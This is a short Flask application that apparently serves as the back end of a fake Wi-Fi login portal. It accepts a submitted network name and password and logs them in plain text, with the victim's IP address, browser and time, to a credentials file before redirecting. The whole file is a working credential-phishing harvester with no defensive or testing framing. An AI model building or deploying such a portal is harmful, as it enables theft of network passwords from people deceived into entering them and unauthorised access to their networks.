from flask import Flask, request, render_template
import datetime

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def login():
    client_ip = request.remote_addr
    user_agent = request.headers.get('User-Agent')
    if request.method == 'POST':
        ssid = request.form.get('ssid')
        password = request.form.get('password')
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"[{timestamp}] IP:{client_ip} UA:{user_agent} SSID:{ssid} PASS:{password}\n"
        with open('credentials.log', 'a') as f:
            f.write(log_entry)
        return render_template('redirect.html')
    return render_template('login.html')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
